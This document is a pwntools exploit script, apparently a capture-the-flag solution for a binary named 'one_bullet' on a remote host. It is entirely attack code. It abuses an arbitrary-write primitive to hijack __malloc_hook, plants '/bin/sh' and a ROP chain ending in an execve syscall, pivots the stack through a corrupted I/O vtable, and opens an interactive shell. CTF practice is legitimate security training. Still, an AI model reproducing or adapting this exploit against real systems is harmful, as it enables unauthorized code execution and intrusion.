from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './one_bullet'
HOST = '51.250.22.68'
PORT = 17003

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [])

def aaw(where, what):
	for i in range(2*5):
		r.sendlineafter(': ', str(i))
	r.sendlineafter(': ', str(where))
	r.sendlineafter(': ', str(1))
	r.sendlineafter(': ', str(what))

syscall = 0x00427184
rax = 0x0045aba5
rdx = 0x004017ef
rdi = 0x004acb3e
rsi = 0x0045fe1e
leave = 0x00401ef3
pivot = 0x00458439

bss = 0x00000000004db000
libc_got = 0x4de018
iovtable = 0x00000000004e0240

# make infloop
aaw(elf.sym.__malloc_hook, elf.sym.main)

# rop payload at iovtable
aaw(bss, u64("/bin/sh\x00"))
aaw(0x4e0240+8+8*0, pivot)
aaw(0x4e0240+8+0x90+8*0, rax)
aaw(0x4e0240+8+0x90+8*1, 0x3b)
aaw(0x4e0240+8+0x90+8*2, rdi)
aaw(0x4e0240+8+0x90+8*3, bss)
aaw(0x4e0240+8+0x90+8*4, rsi)
aaw(0x4e0240+8+0x90+8*5, 0)
aaw(0x4e0240+8+0x90+8*6, rdx)
aaw(0x4e0240+8+0x90+8*7, 0)
aaw(0x4e0240+8+0x90+8*8, syscall)

# pivot
aaw(iovtable + 8*4, leave)

# trigger out fptr
aaw(0xdead, 0xbeef)

r.interactive()
r.close()
